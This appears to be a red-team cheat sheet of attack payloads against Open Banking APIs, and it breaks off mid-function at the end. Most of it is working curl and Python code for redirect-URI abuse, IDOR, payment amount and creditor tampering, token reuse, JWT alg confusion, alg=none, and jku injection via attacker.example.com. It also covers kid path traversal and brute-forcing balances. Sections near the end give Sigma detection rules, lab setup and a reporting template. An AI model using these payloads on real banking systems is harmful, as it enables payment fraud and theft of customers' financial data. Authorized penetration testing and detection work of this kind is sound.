# Open Banking Attack Payloads

> Attack payloads and command lines for red-teaming Open Banking infrastructure. Organized by attack stage and Open Banking flow.

## Conventions

- Replace `auth.example.com`, `api.example.com` with in-scope ASPSP endpoints
- Replace `tpp.example.com` with TPP callback URLs
- Replace `REPLACE_WITH_YOUR_*` placeholders for client IDs, secrets, certs
- All operations assume authorized testing

---

## §1. Discovery

### §1.1 OIDC well-known

```bash
curl -s https://auth.example.com/.well-known/openid-configuration | jq .

# Key fields:
# - authorization_endpoint
# - token_endpoint  
# - userinfo_endpoint
# - jwks_uri
# - request_object_signing_alg_values_supported
# - code_challenge_methods_supported
# - scopes_supported
# - response_modes_supported (should include 'jwt' for JARM)
# - pushed_authorization_request_endpoint (PAR support)
```

### §1.2 OAuth2 dynamic client registration

```bash
curl -X POST https://auth.example.com/register \
  -H 'Content-Type: application/json' \
  -d '{
    "client_name": "Kali Test TPP",
    "redirect_uris": ["https://tpp.example.com/callback"],
    "grant_types": ["client_credentials", "authorization_code", "refresh_token"],
    "response_types": ["code", "code id_token"],
    "scope": "openid accounts payments fundsconfirmations",
    "token_endpoint_auth_method": "tls_client_auth",
    "subject_type": "public"
  }'
```

### §1.3 JWKS enumeration

```bash
curl -s https://auth.example.com/jwks | jq '.keys[]'

# Each key has:
# - kid (key ID)
# - kty (key type — RSA, EC)
# - use (sig, enc)
# - alg (PS256, ES256, etc.)
# - n, e (RSA modulus + exponent)
# - x, y, crv (EC coords + curve)
```

### §1.4 TPP registry recon

```bash
# UK FCA TPP registry
curl -s 'https://register.fca.org.uk/services/V0.1/Search' \
  -d '{"q":"open banking"}' | jq .

# Each TPP has:
# - FRN (Financial Services Register Number)
# - Legal name
# - Permissions (AISP, PISP, CBPII)
# - EBA register link
```

---

## §2. TPP Registration

### §2.1 Sandbox registration

```bash
# UK OBIE sandbox
curl -X POST https://register.sandbox.example.com/v1.1/register/ \
  -H 'Content-Type: application/jwt' \
  --cert sandbox-qseal.crt --key sandbox-qseal.key \
  -d @ssa.jwt

# SSA (Software Statement Assertion) signed by OBIE
# Body:
# {
#   "software_client_id": "...",
#   "software_roles": "AISP,PISP",
#   "software_redirect_uris": ["https://tpp.example.com/cb"],
#   ...
# }
```

### §2.2 eIDAS cert generation (sandbox)

```bash
# Generate QWAC cert
openssl req -x509 -newkey rsa:2048 -keyout qwac.key -out qwac.crt -days 365 \
  -subj "/C=GB/O=Kali Test/CN=tpp.example.com"

# Generate QSeal cert
openssl req -x509 -newkey rsa:2048 -keyout qseal.key -out qseal.crt -days 365 \
  -subj "/C=GB/O=Kali Test/CN=tpp.example.com"

# For production: eIDAS certs from Qualified Trust Service Provider
```

### §2.3 TPP client_id acquisition

```bash
# After SSA accepted, register OAuth2 client
curl -X POST https://auth.example.com/register \
  -H 'Content-Type: application/jwt' \
  --cert qseal.crt --key qseal.key \
  -d @signed_request_object.jwt
# Returns client_id, client_secret (if used)
```

---

## §3. AIS Consent Flow

### §3.1 Create AIS consent

```bash
curl -sk -X POST https://api.example.com/open-banking/v3.1/aisp/account-access-consents \
  -H "Authorization: Bearer $TPP_TOKEN" \
  -H "Content-Type: application/json" \
  --cert qwac.crt --key qwac.key \
  -d '{
    "Data": {
      "Permissions": [
        "ReadAccountsDetail",
        "ReadBalances",
        "ReadTransactionsDetail",
        "ReadBeneficiariesDetail",
        "ReadDirectDebits",
        "ReadStandingOrdersDetail"
      ],
      "ExpirationDateTime": "2027-12-31T00:00:00Z",
      "TransactionFromDateTime": "2015-01-01T00:00:00Z",
      "TransactionToDateTime": "2027-12-31T23:59:59Z"
    },
    "Risk": {}
  }'

# Returns:
# {
#   "Data": {
#     "ConsentId": "acc_...",
#     "Status": "AwaitingAuthorisation",
#     ...
#   }
# }
```

### §3.2 Initiate authorization

```bash
# FAPI requires PAR (Pushed Authorization Request)
PAR_RESPONSE=$(curl -sk -X POST https://auth.example.com/par \
  --cert qwac.crt --key qwac.key \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "response_type=code&client_id=$CLIENT_ID&scope=accounts&code_challenge=$CHALLENGE&code_challenge_method=S256&state=abc123&request=$(base64 request_object.jwt)")

REQUEST_URI=$(echo $PAR_RESPONSE | jq -r .request_uri)

# Redirect customer to authorize
echo "https://auth.example.com/authorize?client_id=$CLIENT_ID&request_uri=$REQUEST_URI"
```

### §3.3 Exchange code for token

```bash
TOKEN_RESPONSE=$(curl -sk -X POST https://auth.example.com/token \
  --cert qwac.crt --key qwac.key \
  -d "grant_type=authorization_code&code=$AUTH_CODE&redirect_uri=https://tpp.example.com/cb&client_id=$CLIENT_ID&code_verifier=$VERIFIER")

ACCESS_TOKEN=$(echo $TOKEN_RESPONSE | jq -r .access_token)
REFRESH_TOKEN=$(echo $TOKEN_RESPONSE | jq -r .refresh_token)
```

### §3.4 Read accounts

```bash
curl -sk https://api.example.com/open-banking/v3.1/aisp/accounts \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  --cert qwac.crt --key qwac.key | jq .
```

---

## §4. PIS Consent Flow

### §4.1 Create PIS consent

```bash
curl -sk -X POST https://api.example.com/open-banking/v3.1/pisp/domestic-payment-consents \
  -H "Authorization: Bearer $TPP_TOKEN" \
  -H "Content-Type: application/json" \
  --cert qwac.crt --key qwac.key \
  -d '{
    "Data": {
      "Initiation": {
        "InstructionIdentification": "kali-1",
        "EndToEndIdentification": "kali-e2e-1",
        "InstructedAmount": {"Amount": "0.01", "Currency": "GBP"},
        "CreditorAccount": {
          "SchemeName": "UK.OBIE.SortCodeAccountNumber",
          "Identification": "12345612345678",
          "Name": "Kali Test"
        },
        "RemittanceInformation": {
          "Reference": "kali-test",
          "Unstructured": "Kali Test Payment"
        }
      }
    },
    "Risk": {}
  }'

# Returns ConsentId
```

### §4.2 Initiate payment

```bash
# After SCA, customer approves
# Exchange auth code for access token

curl -sk -X POST https://api.example.com/open-banking/v3.1/pisp/domestic-payments \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  --cert qwac.crt --key qwac.key \
  -d '{
    "Data": {
      "ConsentId": "pmt_...",
      "Initiation": {
        ... (same as consent)
      }
    },
    "Risk": {}
  }'

# Returns DomesticPaymentId
```

---

## §5. SCA Bypass

### §5.1 Redirect URI manipulation

```bash
# FAPI requires exact redirect URI match
# Try to manipulate redirect to capture code without SCA completion

# 1. Use wildcards in redirect (some implementations allow)
curl -sk "https://auth.example.com/authorize?client_id=...&redirect_uri=https://tpp.example.com/cb&state=...&request_uri=..."

# 2. Use redirect paths the bank whitelisted too broadly
# (e.g., allowlist "*.tpp.example.com" allows attacker.tpp.example.com)

# 3. Open redirector chain
# redirect_uri=https://tpp.example.com/cb?next=https://attacker.example.com/steal
```

### §5.2 SCA exemption abuse

```bash
# PSD2 SCA exemptions:
# - Contactless payments (≤ €50)
# - Trusted beneficiary list (≤ €30)
# - Corporate payments (some exemptions)
# - Repeat payments

# Test: attempt payment just below threshold
# Without SCA
```

### §5.3 Decoupled SCA hijack

```python
# In decoupled SCA, customer approves on banking app
# Attacker can hijack via:
# 1. MITM customer's app-to-app communication
# 2. Push notification spoofing
# 3. Banking app compromise

# Example: intercept auth_id from decoupled SCA
import requests
r = requests.post('https://auth.example.com/backchannel', json={
    'auth_req_id': 'INTERCEPTED_AUTH_ID',  # from MITM
    'client_id': '...'
})
# If bank doesn't bind auth_req_id to device → attacker can use
```

---

## §6. AIS Abuse

### §6.1 IdOR on account IDs

```bash
# Consent for account A
TOKEN=...
ACCOUNT_A=REPLACE_WITH_YOUR_ACCOUNT_A

# Try to read account B
ACCOUNT_B=REPLACE_WITH_YOUR_ACCOUNT_B
curl -sk "https://api.example.com/open-banking/v3.1/aisp/accounts/$ACCOUNT_B" \
  -H "Authorization: Bearer $TOKEN" \
  --cert qwac.crt --key qwac.key

# Try sequential IDs
for i in 1 2 3 4 5; do
  curl -sk "https://api.example.com/open-banking/v3.1/aisp/accounts/$i" \
    -H "Authorization: Bearer $TOKEN" \
    --cert qwac.crt --key qwac.key | jq -r '.Data.Account[]?.AccountId // .'
done
```

### §6.2 Read transactions beyond scope

```bash
# Consent has TransactionFromDateTime = 2025-01-01
# Try to read older transactions

curl -sk "https://api.example.com/open-banking/v3.1/aisp/accounts/$ACCOUNT_ID/transactions?fromBookingDateTime=2020-01-01" \
  -H "Authorization: Bearer $TOKEN" \
  --cert qwac.crt --key qwac.key
```

### §6.3 Permission scope escalation

```bash
# Consent has Permissions: ["ReadAccountsDetail", "ReadBalances"]
# Try to read beneficiaries (not in scope)

curl -sk "https://api.example.com/open-banking/v3.1/aisp/accounts/$ACCOUNT_ID/beneficiaries" \
  -H "Authorization: Bearer $TOKEN" \
  --cert qwac.crt --key qwac.key

# Try direct debits
curl -sk "https://api.example.com/open-banking/v3.1/aisp/accounts/$ACCOUNT_ID/direct-debits" \
  -H "Authorization: Bearer $TOKEN" \
  --cert qwac.crt --key qwac.key

# Try standing orders
curl -sk "https://api.example.com/open-banking/v3.1/aisp/accounts/$ACCOUNT_ID/standing-orders" \
  -H "Authorization: Bearer $TOKEN" \
  --cert qwac.crt --key qwac.key
```

---

## §7. PIS Abuse

### §7.1 Debtor account manipulation

```bash
# After consent with debtor A, submit payment with debtor B
# (consent captured debtor, but submission changes debtor)

curl -sk -X POST https://api.example.com/open-banking/v3.1/pisp/domestic-payments \
  -H "Authorization: Bearer $TOKEN" \
  --cert qwac.crt --key qwac.key \
  -d '{
    "Data": {
      "ConsentId": "pmt_...",
      "Initiation": {
        "InstructionIdentification": "kali-1",
        "EndToEndIdentification": "kali-e2e-1",
        "InstructedAmount": {"Amount": "1000.00", "Currency": "GBP"},
        "CreditorAccount": {
          "SchemeName": "UK.OBIE.SortCodeAccountNumber",
          "Identification": "ATTACKER_CREDITOR_ACCT"
        },
        "DebtorAccount": {
          "SchemeName": "UK.OBIE.SortCodeAccountNumber",
          "Identification": "REPLACE_WITH_DIFFERENT_DEBTOR_ACCT"
        }
      }
    },
    "Risk": {}
  }'

# If payment succeeds with different debtor — manipulation worked
```

### §7.2 Amount escalation after consent

```bash
# Consent for 0.01 GBP
# Try to submit payment for 1000 GBP using same consent

curl -sk -X POST https://api.example.com/open-banking/v3.1/pisp/domestic-payments \
  -H "Authorization: Bearer $TOKEN" \
  --cert qwac.crt --key qwac.key \
  -d '{
    "Data": {
      "ConsentId": "pmt_...",
      "Initiation": {
        ...,
        "InstructedAmount": {"Amount": "1000.00", "Currency": "GBP"}
      }
    }
  }'

# If payment succeeds — consent amount not enforced
```

### §7.3 Multiple payments per consent

```bash
# Domestic payments should be one-per-consent
# Try to use consent twice

for i in 1 2 3; do
  curl -sk -X POST https://api.example.com/open-banking/v3.1/pisp/domestic-payments \
    -H "Authorization: Bearer $TOKEN" \
    --cert qwac.crt --key qwac.key \
    -d '{
      "Data": {
        "ConsentId": "pmt_...",
        ...
      }
    }'
done

# If multiple succeed — consent re-use bug
```

### §7.4 Creditor account manipulation post-SCA

```bash
# After SCA with creditor A, modify creditor in payment submission
# Customer approved payment to A, but payment goes to B

# Use consent with creditor A
CONSENT_BODY='{"Data":{"Initiation":{...,"CreditorAccount":{"Identification":"A"}}}}'
# Get consent_id

# Submit payment with creditor B
PAYMENT_BODY='{"Data":{"ConsentId":"...", "Initiation":{...,"CreditorAccount":{"Identification":"B"}}}}'
curl -X POST .../domestic-payments -d "$PAYMENT_BODY"
```

---

## §8. Token Abuse

### §8.1 mTLS bypass

```bash
# Token issued with mTLS cert A
TOKEN=...

# Try to use token WITHOUT any cert
curl -sk https://api.example.com/open-banking/v3.1/aisp/accounts \
  -H "Authorization: Bearer $TOKEN"

# Try with different cert (B)
curl -sk https://api.example.com/open-banking/v3.1/aisp/accounts \
  -H "Authorization: Bearer $TOKEN" \
  --cert other.crt --key other.key

# If either succeeds — mTLS not enforced
```

### §8.2 DPoP bypass

```bash
# Token issued with DPoP proof A
TOKEN=...

# Try to use token WITHOUT DPoP header
curl -sk https://api.example.com/open-banking/v3.1/aisp/accounts \
  -H "Authorization: Bearer $TOKEN"

# Try with tampered DPoP proof
curl -sk https://api.example.com/open-banking/v3.1/aisp/accounts \
  -H "Authorization: Bearer $TOKEN" \
  -H "DPoP: $(cat tampered_dpop.proof)"

# If either succeeds — DPoP not enforced
```

### §8.3 Refresh token abuse

```bash
# Refresh tokens often have infinite lifetime
REFRESH=...

# Loop refresh forever
while true; do
  RESPONSE=$(curl -sk -X POST https://auth.example.com/token \
    --cert qwac.crt --key qwac.key \
    -d "grant_type=refresh_token&refresh_token=$REFRESH&client_id=$CLIENT_ID")
  ACCESS=$(echo $RESPONSE | jq -r .access_token)
  NEW_REFRESH=$(echo $RESPONSE | jq -r .refresh_token)
  REFRESH=$NEW_REFRESH
  echo "Got new token"
  sleep 3600
done
```

### §8.4 JWT alg confusion

```bash
# Get bank's public key
curl -s https://auth.example.com/jwks | jq '.keys[0]'

# Convert JWK to PEM
python3 -c "
import json, base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

jwk = json.load(open('bank-pub.json'))
n = int.from_bytes(base64.urlsafe_b64decode(jwk['n'] + '==='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(jwk['e'] + '==='), 'big')
pub = rsa.RSAPublicNumbers(e, n).public_key()
open('bank-pub.pem', 'wb').write(pub.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo))
"

# Algorithm confusion attack
# Bank expects: alg=PS256 (RSA), but accepts HS256 (HMAC)
# Trick: use bank's PUBLIC KEY as HMAC secret

# Forge JWT with HS256
python3 -c "
import jwt
key = open('bank-pub.pem', 'rb').read()  # used as HMAC secret
token = jwt.encode({'sub': 'admin', 'groups': ['admin']}, key, algorithm='HS256')
print(token)
"

# Submit forged token
curl -sk https://api.example.com/open-banking/v3.1/aisp/accounts \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

### §8.5 jku / x5u header injection

```python
# JWT signature with attacker key, claim verified via attacker JWKS

import jwt
import json

# Generate attacker RSA key
from cryptography.hazmat.primitives.asymmetric import rsa
priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)

# Create attacker JWKS
pub = priv.public_key()
from cryptography.hazmat.primitives import serialization
pub_pem = pub.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo)

# Extract n, e from PEM
import base64
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
nums = pub.public_numbers()
n_bytes = nums.n.to_bytes((nums.n.bit_length() + 7) // 8, 'big')
e_bytes = nums.e.to_bytes((nums.e.bit_length() + 7) // 8, 'big')

attacker_jwks = {
    'keys': [{
        'kty': 'RSA',
        'kid': 'kali-1',
        'use': 'sig',
        'alg': 'PS256',
        'n': base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode(),
        'e': base64.urlsafe_b64encode(e_bytes).rstrip(b'=').decode()
    }]
}
open('attacker-jwks.json', 'w').write(json.dumps(attacker_jwks))

# Serve attacker-jwks.json at https://attacker.example.com/jwks.json

# Sign JWT with attacker private key, header points to attacker jku
priv_pem = priv.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption())

token = jwt.encode(
    {'sub': 'admin', 'groups': ['admin'], 'consent_id': 'all_accounts'},
    priv_pem,
    algorithm='PS256',
    headers={'jku': 'https://attacker.example.com/jwks.json', 'kid': 'kali-1'}
)
print(token)
```

---

## §9. Consent Manipulation

### §9.1 Consent re-use across TPPs

```bash
# TPP-A creates consent_123
# Try to use consent_123 from TPP-B (different cert)

TOKEN_B=...
curl -sk "https://api.example.com/open-banking/v3.1/aisp/accounts/$ACCOUNT_ID/transactions" \
  -H "Authorization: Bearer $TOKEN_B" \
  --cert tpp_b_qwac.crt --key tpp_b_qwac.key

# If consent not tied to TPP — token B can use consent from A
```

### §9.2 Consent scope expansion

```bash
# Original consent: ReadAccountsDetail, ReadBalances
# Try to add permissions after creation

curl -sk -X PUT https://api.example.com/open-banking/v3.1/aisp/account-access-consents/$CONSENT_ID \
  -H "Authorization: Bearer $TPP_TOKEN" \
  --cert qwac.crt --key qwac.key \
  -d '{
    "Data": {
      "Permissions": [
        "ReadAccountsDetail",
        "ReadBalances",
        "ReadTransactionsDetail",
        "ReadBeneficiariesDetail"
      ]
    }
  }'
```

### §9.3 Long-lived consent

```bash
# FAPI limits consent duration to 12 months (RTS)
# Try to create consent with longer duration

curl -sk -X POST https://api.example.com/open-banking/v3.1/aisp/account-access-consents \
  -H "Authorization: Bearer $TPP_TOKEN" \
  --cert qwac.crt --key qwac.key \
  -d '{
    "Data": {
      "Permissions": [...],
      "ExpirationDateTime": "2099-12-31T00:00:00Z",
      "RecurringIndicator": true
    }
  }'

# If consent created — bank doesn't enforce RTS limits
```

### §9.4 Consent without SCA

```bash
# Some consents shouldn't require SCA (e.g., card-based IISP funds confirmation)
# Try to get AIS consent without SCA

curl -sk -X POST https://api.example.com/open-banking/v3.1/aisp/account-access-consents \
  -H "Authorization: Bearer $TPP_TOKEN" \
  --cert qwac.crt --key qwac.key \
  -d '{...}'

# Status returned: AwaitingAuthorisation (SCA required)
# OR Authorised (SCA skipped — vulnerable)
```

---

## §10. JWT & JWS Attacks

### §10.1 JWT structure

```
header.payload.signature

Header: {"alg":"PS256","typ":"JWT","kid":"1"}
Payload: {"sub":"admin","exp":...,"consent_id":"..."}
Signature: PS256(header + "." + payload, private_key)
```

### §10.2 alg=none attack

```bash
# Older JWT libraries accept alg=none
HEADER='{"alg":"none","typ":"JWT"}'
PAYLOAD='{"sub":"admin","groups":["admin"]}'

# Encode
B64H=$(echo -n $HEADER | base64 -w0 | tr -d '=' | tr '/+' '_-')
B64P=$(echo -n $PAYLOAD | base64 -w0 | tr -d '=' | tr '/+' '_-')

FORGED="$B64H.$B64P."  # empty signature

curl -sk https://api.example.com/open-banking/v3.1/aisp/accounts \
  -H "Authorization: Bearer $FORGED"
```

### §10.3 kid path traversal

```python
# Some JWT libs read key from file based on kid
# Try: kid = "../../dev/null" → empty key
# Try: kid = "/etc/passwd" → leak file content via signature

import jwt
token = jwt.encode({...}, '', algorithm='HS256',
                   headers={'kid': '../../../../dev/null'})
print(token)
```

### §10.4 JWE decryption attacks

```bash
# FAPI may use JWE for encrypted requests
# Pad attack: probe block size
# Or CVE-2022-21449 ECDSA signature forgery
```

---

## §11. App-to-App (A2A) Payment

### §11.1 A2A flow

```
Customer app → TPP app → Open Banking consent
                ↓
              Bank app (SCA)
                ↓
              Return to TPP with code
                ↓
              TPP completes payment
```

### §11.2 Redirect interception

```bash
# MITM customer device
mitmproxy --mode regular --listen-port 8888

# Look for:
# GET https://tpp.example.com/return?code=abc&state=xyz

# Replay the code via different TPP
curl -X POST https://auth.example.com/token \
  -d "grant_type=authorization_code&code=$INTERCEPTED_CODE&..."
```

### §11.3 Push notification spoof

```bash
# Bank sends push notification to customer's banking app for SCA
# Customer taps approve

# If push notification can be spoofed (no cert pinning), attacker can:
# - Send fake push
# - Customer approves
# - Attacker gets SCA approval for attacker's payment
```

---

## §12. CIBA (Client-Initiated Backchannel Auth)

### §12.1 CIBA flow

```bash
# CIBA: TPP authenticates customer without browser redirect
# Customer gets push notification / SMS for SCA

curl -X POST https://auth.example.com/bc-authorize \
  --cert qwac.crt --key qwac.key \
  -d '{
    "scope": "accounts",
    "login_hint": "customer@bank.example.com",
    "binding_message": "Kali TPP",
    "user_code": "1234"
  }'

# Returns auth_req_id
# Customer approves via banking app
# TPP polls token endpoint

curl -X POST https://auth.example.com/token \
  --cert qwac.crt --key qwac.key \
  -d "grant_type=urn:openid:params:grant-type:ciba&auth_req_id=$AUTH_REQ_ID&client_id=..."
```

### §12.2 CIBA auth_req_id replay

```bash
# auth_req_id should be one-time use
# Try to use same auth_req_id multiple times

for i in 1 2 3; do
  curl -X POST https://auth.example.com/token \
    --cert qwac.crt --key qwac.key \
    -d "grant_type=urn:openid:params:grant-type:ciba&auth_req_id=$AUTH_REQ_ID&client_id=..."
done
```

---

## §13. CBPII Funds Confirmation

### §13.1 Funds confirmation flow

```bash
# CBPII: Card-Based Payment Instrument Issuer
# Confirms funds are available for card payment

# Create funds confirmation consent
curl -sk -X POST https://api.example.com/open-banking/v3.1/cbpii/funds-confirmations \
  -H "Authorization: Bearer $TPP_TOKEN" \
  --cert qwac.crt --key qwac.key \
  -d '{
    "Data": {
      "ConsentId": "...",
      "InstructedAmount": {"Amount": "100.00", "Currency": "GBP"}
    }
  }'

# Returns: FundsAvailable: true/false
```

### §13.2 Brute-force account balance

```bash
# Iterate funds confirmation with different amounts to discover balance

for amt in 100 500 1000 5000 10000 50000; do
  curl -sk -X POST https://api.example.com/open-banking/v3.1/cbpii/funds-confirmations \
    -H "Authorization: Bearer $TOKEN" \
    --cert qwac.crt --key qwac.key \
    -d "{...,\"InstructedAmount\":{\"Amount\":\"$amt.00\",\"Currency\":\"GBP\"}}" | jq .
done
# Binary search converges on actual balance
```

---

## §14. Detection Engineering

### §14.1 Sigma rules

```yaml
title: AIS read beyond consent scope
logsource:
  product: open-banking
  service: api
detection:
  selection:
    endpoint: /accounts/{id}/transactions
    response.status: 200
  outOfScope:
    request.account_id|re: !consent.account_ids
  condition: selection and outOfScope
level: critical
```

```yaml
title: PIS to new creditor without SCA
logsource:
  product: open-banking
  service: pisp
detection:
  selection:
    event: payment-submission
    creditor_account|re: !customer_baseline.creditors
  noSCA:
    sca.performed: false
  condition: selection and noSCA
level: critical
```

```yaml
title: JWT algorithm confusion
logsource:
  product: auth
  service: token
detection:
  selection:
    event: token-validation
    jwt.header.alg: HS256
  bankKeyAlg:
    bank_key.type: RSA
  condition: selection and bankKeyAlg
level: critical
```

### §14.2 ASPSP detection patterns

```yaml
# Consent rapid creation (TPP scanning)
- rule: TPP creates >100 consents/min
  desc: Detect TPP scanning customer base
  condition: count(group_by=client_id, time=60s) > 100
  priority: WARNING

# Token from non-TPP cert
- rule: Token used without matching mTLS cert
  desc: Token issued with cert A but used with cert B
  condition: token.client_cert != request.client_cert
  priority: CRITICAL

# Refresh token rotation abuse
- rule: Refresh token loop
  desc: Same refresh token family rotating >5x/day
  condition: count(group_by=refresh_token_family, time=24h) > 5
  priority: WARNING
```

---

## §15. Lab Setup

### §15.1 Local Open Banking sandbox

```bash
# UK Open Banking sandbox (free)
# Register at: https://sandbox.openbanking.example.com/

# Or self-host mock bank
git clone https://github.com/OpenBankingToolkit/mock-asp.git
cd mock-asp
docker-compose up
```

### §15.2 TPP sandbox

```bash
# WSO2 Financial-grade API server
docker run -d -p 9443:9443 wso2/wso2is:5.11.0

# Or Apigee Open Banking
# (commercial)
```

### §15.3 eIDAS mock CA

```bash
# Generate mock eIDAS certs for testing
openssl req -x509 -newkey rsa:2048 -keyout mock_qwac.key -out mock_qwac.crt -days 365 \
  -subj "/C=GB/O=Mock eIDAS/CN=tpp.example.com" \
  -addext "extendedKeyUsage=serverAuth,clientAuth"
```

---

## §16. Reporting Template

```markdown
### Open Banking Engagement Report

**Findings**:
- ASPSP: example.com (UK OBIE)
- FAPI profile: FAPI 1.0 Baseline (not Advanced — mTLS not enforced)
- Vulnerabilities:
  - AIS IdOR: account B accessible with account A's consent
  - JWT alg confusion: PS256 → HS256 bypass
  - Refresh token infinite: 5+ rotations without customer approval

**Impact**:
- Customer financial data exposed
- Potential unauthorized payments
- Consent re-use across TPPs

**Evidence**:
- /tmp/evidence/tokens/*.jwt
- /tmp/evidence/api-responses/*.json
- /tmp/evidence/mitmproxy-capture.mitm

**Remediation**:
1. Enforce FAPI 2.0 Security Profile
2. Fix AIS account ID scoping
3. Enforce alg=PS256 only
4. Refresh token rotation limit

**Detection Rule**:
<sigma rule>
```

---

## §17. Recon Cheatsheet

```bash
# All Open Banking endpoints
curl -s https://bank.example.com/.well-known/openid-configuration | jq '. | keys'

# All JWKS
curl -s https://auth.example.com/jwks | jq '.keys[].kid'

# All TPPs in FCA registry
curl -s 'https://register.fca.org.uk/services/V0.1/Search?q=AISP' | jq '.hits.hits[]._source.name'

# All consent scopes supported
curl -s https://auth.example.com/.well-known/openid-configuration | jq '.scopes_supported'

# Check FAPI version
curl -s https://auth.example.com/.well-known/openid-configuration | jq '.request_object_signing_alg_values_supported'
```

---

## §18. FAPI 2.0 Message Signing Attacks

```bash
# Detached JWS signing of request/response objects
# Generate EC P-256 key for client signing
openssl ecparam -name prime256v1 -genkey -noout -out client.key
openssl req -new -key client.key -x509 -out client.crt -days 365 \
  -subj "/CN=TPP Client"
```

```python
# Validate FAPI 2.0 response object (JARM-style)
import jwt
from jwt import PyJWKClient

def verify_fapi_response(response_jwt, issuer_jwks_url):
    jwk_client = PyJWKClient(issuer_jwks_url)
    signing_key = jwk_client.get_signing_key_from_jwt(response_jwt)
    decoded = jwt.decode(
        response_jwt,
        signing_key.key,
        algorithms=["ES256", "PS256"],
        audience="tpp-client-id",
        issuer="https://as.example.com",
        options={"verify_aud": True, "verify_iss": True, "require": ["exp", "iat", "jti"]}
    )
    return decoded
```

```bash
# Test for JWS signature confusion (alg confusion attack)
python3 -c "
import jwt
public = open('aspsp_pub.pem').read()
try:
    forged = jwt.encode({'sub':'victim'}, public, algorithm='HS256')
    print('Forged:', forged[:50])
except Exception as e:
    print('Error:', e)
"
```

```bash
# Test for request_uri abuse (FAPI PAR with external uri)
curl -X POST https://as.example.com/as/authorization.oauth2 \
  -d "client_id=$CID&request_uri=https://attacker.example.com/evil.jwt"

# Test for request_uri without PAR registration
curl "https://as.example.com/as/authorization.oauth2?client_id=$CID&request_uri=urn:example:tx-abc123"
```

```python
# Claim injection in authorization request
import json, base64
def b64url(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()

rogue_request = {
    "iss": "legit-tpp",
    "aud": "https://as.example.com",
    "claims": {
        "userinfo": {
            "account_number": None,
            "transaction_list": None
        },
        "id_token": {
            "acr": {"essential": True, "values": ["urn:openbanking:psd2:sca"]},
            "txn": "attacker-controlled-txn-id"
        }
    }
}
print(b64url(rogue_request))
```

---

## §19. Cross-Border / Multi-Region Variant Payloads

```bash
# UK OBIE v3.1.11 (post-2024)
curl -X POST https://uk-bank.example.com/open-banking/v3.1/pisp/domestic-payments \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-fapi-financial-id: 0015800000jf2V9AAI" \
  -H "x-fapi-customer-ip-address: 1.2.3.4" \
  -H "x-fapi-customer-last-logged-time: $(date -u +%FT%TZ)" \
  -H "x-idempotency-key: $(uuidgen)" \
  -d '{"Data":{"Initiation":{"InstructedAmount":{"Amount":"1.00","Currency":"GBP"},"CreditorAccount":{"SchemeName":"UK.OBIE.SortCodeAccountNumber","Identification":"12345612345678","Name":"Bob"},"DebtorAccount":{"SchemeName":"UK.OBIE.SortCodeAccountNumber","Identification":"01234501234567","Name":"Alice"},"EndToEndIdentification":"fresno-001","InstructionIdentification":"fresno-001-a","RemittanceInformation":{"Reference":"fresno","Unstructured":"Invoice 1"}}}}'
```

```bash
# Brazil Open Finance stage 4 (payments)
curl -X POST https://br-bank.example.br/open-banking/payments/v4/pix/payments \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-idempotency-key: $(uuidgen)" \
  -d '{"data":{"localInstrument":"DICT","payment":{"amount":"100.00","currency":"BRL"},"creditorAccountDTO":{"ispb":"12345678","issuer":"0001","number":"12345678","accountType":"CACC"},"proxy":"12345678901"}}'
```

```bash
# India Account Aggregator (FIU to AA Fetch)
curl -X POST https://aa.example.in/AA_ID/API/v1/FI/fetch \
  -H "Content-Type: application/json" \
  -H "x-aa-signature: $SIG" \
  -d '{"ver":"1.1.0","txnid":"txn-001","consentId":"uuid-1234","FIDataRange":{"from":"2024-01-01","to":"2024-12-31"},"KeyMaterial":{"cryptoAlg":"ECDHE","curve":"Curve25519","DHPublicKey":{"Parameters":"predist","Exponent":"base64"}}}'
```

```bash
# Singapore MAS APIX (consumer data)
curl -X POST https://sg-bank.example.sg/apix/v1/customer/accounts \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-api-key: $API_KEY" \
  -H "x-request-id: $(uuidgen)" \
  -d '{"accountId":"SG-001"}'
```

```bash
# Australia CDR energy sector
curl https://au-energy.example.com.au/cds-au/v1/energy/accounts \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-cds-client-headers: User-Agent=Test" \
  -H "x-fapi-interaction-id: $(uuidgen)"
```

```bash
# US FDX (financial data exchange)
curl https://api.fdx.example.com/fdx/v6/accounts \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-fdx-api-version: 6.0"
```

```python
# Auto-detect region from ASPSP well-known config
import requests
def detect_region(well_known_url):
    r = requests.get(well_known_url).json()
    region_hints = {
        "request_authentication_methods_supported": "FAPI 2.0",
        "request_object_signing_alg_values_supported": "FAPI 1.0",
        "token_endpoint_auth_methods_supported": "PSD2 vs FDX",
    }
    return {k: r.get(k) for k in region_hints}
```

```bash
# EBA PSD2 register polling
while read aspsp; do
  echo "=== $aspsp ==="
  curl -s "https://euclid.eba.europa.eu/register/api/aspsp/$aspsp/services" | jq '.[] | {serviceName, psd2Scope}'
done < aspsps.txt
```

```bash
# UK FCA register + consumer credit search
for name in "Barclays" "HSBC" "Lloyds" "NatWest" "Santander"; do
  curl -s "https://register.fca.org.uk/services/V0.1/Search?q=$name" | jq '.hits.hits[]._source | {name, status}'
done
```

```bash
# Brazil OF directory scraper (stage 4)
curl -s https://dir.openfinancebrasil.org.br/api/v1/participants \
  | jq '.[] | select(.status=="Active") | {orgDomain, registrationDate}'

# India AA master directory
curl -s https://api.sahamati.org.in/regulator/aa-directory \
  | jq '.[].aaName'
```

```bash
# Quick FAPI profile fingerprinter
fapi_profile() {
